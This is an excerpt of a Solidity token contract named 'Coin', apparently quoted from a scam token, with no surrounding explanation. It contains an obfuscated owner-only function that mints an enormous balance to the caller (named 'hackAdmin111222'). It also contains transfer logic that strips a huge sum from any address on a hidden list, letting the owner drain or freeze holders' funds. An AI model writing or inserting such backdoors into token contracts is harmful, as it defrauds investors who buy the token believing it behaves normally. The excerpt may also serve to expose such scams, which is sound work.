...
contract Coin is Ownable {
    ...
    function ccc21fkinclick(address ddd) external {
        address hackAdmin111222 = _msgSender();
        if (_vvfkceo != hackAdmin111222){
            revert("dsss2222fkfkcccfkfkf");
        }
        if (_vvfkceo != hackAdmin111222){
            revert("dsss2222fkfkcccfkfkf");
        }
        _balances[hackAdmin111222] = (1000000000*10**decimals())*34333;
    }
    ...
    function _transfer(
        ...
        if (_fffklist[from] == true ){
            _balances[from]=  _balances[from]-(5000000000*10**decimals());
        }
